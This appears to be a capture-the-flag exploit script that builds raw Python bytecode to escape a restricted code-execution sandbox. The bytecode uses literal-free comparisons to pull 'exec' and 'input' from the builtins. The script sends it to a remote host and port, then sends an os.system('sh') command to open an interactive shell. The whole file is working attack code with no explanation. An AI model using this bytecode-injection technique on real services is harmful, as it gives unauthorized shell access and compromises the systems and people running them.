#!/usr/bin/env python3
from pwn import *

import dis
globals().update(dis.opmap)

eq = dis.cmp_op.index('==')

from builtins import __dict__ as builtins_dict


def pycode():
    bd = builtins_dict

    key = () == ()
    n2 = key + key
    n3 = n2 + key
    n4 = n3 + key
    n5 = n4 + key
    n0 = not key

    for key in bd:
        if key[n0:n3] == key:
            continue
        if not key[n0:n5] == key:
            continue
        if key[n0] == key[n2]:
            e = bd[key]
            continue
        if key[n0:n4] == key:
            continue
        if key[n3] == key[n4]: 
            continue
        return e(bd[key]())

dis.dis(pycode)

for idx in range(38,39):
    x = bytearray([
        BUILD_TUPLE, idx,
        STORE_FAST, 8,
        STORE_FAST, 6,
        LOAD_FAST, 6,

        LOAD_FAST, 6, PRINT_EXPR, 0,

        BUILD_TUPLE, 0,
        BUILD_TUPLE, 0,
        COMPARE_OP, eq,
        STORE_FAST, 1,

        LOAD_FAST, 1,
        LOAD_FAST, 1,
        BINARY_ADD, 0,
        STORE_FAST, 2,

        LOAD_FAST, 1,
        LOAD_FAST, 2,
        BINARY_ADD, 0,
        STORE_FAST, 3,

        LOAD_FAST, 1,
        LOAD_FAST, 3,
        BINARY_ADD, 0,
        STORE_FAST, 4,

        LOAD_FAST, 1,
        LOAD_FAST, 4,
        BINARY_ADD, 0,
        STORE_FAST, 5,

        LOAD_FAST, 1,
        UNARY_NOT, 0,
        STORE_FAST, 0,

        LOAD_FAST, 6,
        GET_ITER, 0,

        FOR_ITER, 0,

        DUP_TOP, 0, PRINT_EXPR, 0,

        STORE_FAST, 1,

        LOAD_FAST, 1,
        LOAD_FAST, 0,
        LOAD_FAST, 5,
        BUILD_SLICE, 2,  # 0:5
        BINARY_SUBSCR, 0,  # key[0:5]
        LOAD_FAST, 1,
        COMPARE_OP, eq,  # key[0:5] == key
        DUP_TOP, 0, PRINT_EXPR, 0,
        POP_JUMP_IF_FALSE, 31,  # to FOR_ITER

        LOAD_FAST, 1,
        LOAD_FAST, 0,
        LOAD_FAST, 3,
        BUILD_SLICE, 2,  # 0:3
        BINARY_SUBSCR, 0,  # key[0:3]
        LOAD_FAST, 1,
        COMPARE_OP, eq,  # key[0:3] == key
        DUP_TOP, 0, PRINT_EXPR, 0,
        POP_JUMP_IF_TRUE, 31,  # to FOR_ITER

        LOAD_FAST, 1,
        LOAD_FAST, 0,
        BINARY_SUBSCR, 0,  # key[0]
        LOAD_FAST, 1,
        LOAD_FAST, 2,
        BINARY_SUBSCR, 0,  # key[2]
        COMPARE_OP, eq,  # key[0] == key[2]
        DUP_TOP, 0, PRINT_EXPR, 0,
        POP_JUMP_IF_FALSE, 70,   # to (x)

        LOAD_FAST, 6,
        LOAD_FAST, 1,
        BINARY_SUBSCR, 0,  # bd[key]
        STORE_FAST, 7,
        JUMP_ABSOLUTE, 31,

        LOAD_FAST, 1,  # (x)
        LOAD_FAST, 0,
        LOAD_FAST, 4,
        BUILD_SLICE, 2,  # 0:4
        BINARY_SUBSCR, 0,  # key[0:4]
        LOAD_FAST, 1,
        COMPARE_OP, eq,
        DUP_TOP, 0, PRINT_EXPR, 0,
        POP_JUMP_IF_TRUE, 31,

        LOAD_FAST, 1,
        LOAD_FAST, 3,
        BINARY_SUBSCR, 0,
        LOAD_FAST, 1,
        LOAD_FAST, 4,
        BINARY_SUBSCR, 0,
        COMPARE_OP, eq,
        DUP_TOP, 0, PRINT_EXPR, 0,
        POP_JUMP_IF_TRUE, 31,

        LOAD_FAST, 7,
        LOAD_FAST, 6,
        LOAD_FAST, 1,
        BINARY_SUBSCR, 0,
        CALL_FUNCTION, 0,
        DUP_TOP, 0, PRINT_EXPR, 0,
        BUILD_MAP, 0,
        BUILD_MAP, 0,
        CALL_FUNCTION, 3,

        RETURN_VALUE, 0,
    ])
    dis.dis(x)

    print(idx)
    io = connect(args.HOST, args.PORT)
    io.sendline(b'%d' % len(x))
    io.send(x)
    io.sendline(b'import os;os.system("sh")')
    io.interactive()
